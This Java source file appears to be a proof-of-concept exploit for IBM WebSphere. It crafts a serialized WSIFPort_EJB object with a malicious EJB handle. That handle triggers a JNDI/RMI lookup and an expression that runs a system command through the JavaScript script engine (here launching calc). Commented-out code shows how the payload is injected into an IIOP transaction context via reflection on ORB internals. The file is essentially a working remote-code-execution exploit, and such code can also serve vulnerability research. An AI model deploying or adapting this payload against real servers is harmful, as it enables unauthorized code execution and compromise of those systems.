// javac -cp .:plugins/com.ibm.ws.runtime.jar:plugins/com.ibm.ws.batch.runtime.jar:plugins/javax.j2ee.ejb.jar:runtimes/com.ibm.jaxws.thinclient_9.0.jar --add-modules jdk.naming.rmi --add-exports='jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED' Test.java

import org.apache.wsif.providers.ejb.*;
import com.ibm.ws.ejbcontainer.jitdeploy.EJBWrapper;
import com.ibm.ejs.container.*;
import com.ibm.ejs.csi.*;
import com.ibm.websphere.csi.*;
import java.lang.reflect.*;
import com.ibm.ws.batch.*;
import java.rmi.*;
import javax.ejb.*;
import javax.wsdl.*;
import java.io.*;
import java.util.*;

public class Test {
    public static void main(String[] args) throws Exception {
        /*Properties env = new Properties();
        env.put(Context.PROVIDER_URL, "iiop://169.254.0.117:2809");
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.ibm.websphere.naming.WsnInitialContextFactory");

        InitialContext context = new InitialContext(env);
        context.list("");

        Field f_defaultInitCtx = context.getClass().getDeclaredField("defaultInitCtx");
        f_defaultInitCtx.setAccessible(true);
        WsnInitCtx defaultInitCtx = (WsnInitCtx) f_defaultInitCtx.get(context);

        Field f_context = defaultInitCtx.getClass().getDeclaredField("_context");
        f_context.setAccessible(true);
        CNContextImpl _context = (CNContextImpl) f_context.get(defaultInitCtx);

        Field f_corbaNC = _context.getClass().getDeclaredField("_corbaNC");
        f_corbaNC.setAccessible(true);
        _NamingContextStub _corbaNC = (_NamingContextStub) f_corbaNC.get(_context);

        Field f__delegate = ObjectImpl.class.getDeclaredField("__delegate");
        f__delegate.setAccessible(true);
        ClientDelegate clientDelegate = (ClientDelegate) f__delegate.get(_corbaNC);

        Field f_ior = clientDelegate.getClass().getSuperclass().getDeclaredField("ior");
        f_ior.setAccessible(true);
        IOR ior = (IOR) f_ior.get(clientDelegate);

        Field f_orb = clientDelegate.getClass().getSuperclass().getDeclaredField("orb");
        f_orb.setAccessible(true);
        ORB orb = (ORB) f_orb.get(clientDelegate);

        GIOPImpl giop = (GIOPImpl) orb.getServerGIOP();
        Method getConnection = giop.getClass().getDeclaredMethod("getConnection", com.ibm.CORBA.iiop.IOR.class, com.ibm.rmi.Profile.class, com.ibm.rmi.corba.ClientDelegate.class, String.class);
        getConnection.setAccessible(true);
        Connection connection = (Connection) getConnection.invoke(giop, ior, ior.getProfile(), clientDelegate, "beijixiong404");
        Method setConnectionContexts = connection.getClass().getDeclaredMethod("setConnectionContexts", ArrayList.class);
        setConnectionContexts.setAccessible(true);

        ArrayList v4 = new ArrayList();*/

        WSIFPort_EJB wsifPort_ejb = new WSIFPort_EJB(null,null,null);

        Field fieldEjbObject = wsifPort_ejb.getClass().getDeclaredField("fieldEjbObject");
        fieldEjbObject.setAccessible(true);
        fieldEjbObject.set(wsifPort_ejb,new EJSWrapperS());

        /*CDROutputStream outputStream = ORB.createCDROutputStream();
        outputStream.putEndian();
        Any any = orb.create_any();
        any.insert_Value(wsifPort_ejb);
        PropagationContext propagationContext = new PropagationContext(0,
                new TransIdentity(null,null, new otid_t(0,0,new byte[0])),
                new TransIdentity[0],
                any);
        PropagationContextHelper.write(outputStream,propagationContext);
        byte[] result = outputStream.toByteArray();
        ServiceContext serviceContext = new ServiceContext(0, result);
        v4.add(serviceContext);
        setConnectionContexts.invoke(connection, v4);
        context.list("");*/
    }

}
class EJSWrapperS extends EJSWrapper {
    @Override
    public Handle getHandle() throws RemoteException {
        Handle var2 = null;
        try {
            SessionHome sessionHome = new SessionHome();
            J2EEName j2EEName = new J2EENameImpl("aa", "aa", "aa");
            Field j2eeName = EJSHome.class.getDeclaredField("j2eeName");
            j2eeName.setAccessible(true);
            j2eeName.set(sessionHome, j2EEName);
            Field jndiName = sessionHome.getClass().getSuperclass().getDeclaredField("jndiName");
            jndiName.setAccessible(true);
            jndiName.set(sessionHome, "rmi://127.0.0.1:1099/poc");
            Serializable key = "\"a\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")";
            BeanId beanId = new BeanId(sessionHome, key, true);
            BeanMetaData beanMetaData = new BeanMetaData(1);
            beanMetaData.homeInterfaceClass = com.ibm.ws.batch.CounterHome.class;
            Properties initProperties = new Properties();
            initProperties.setProperty("java.naming.factory.object", "org.apache.wsif.naming.WSIFServiceObjectFactory");
            Constructor c = EntityHandle.class.getDeclaredConstructor(BeanId.class, BeanMetaData.class, Properties.class);
            c.setAccessible(true);
            var2 = (Handle) c.newInstance(beanId, beanMetaData, initProperties);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return var2;
    }
}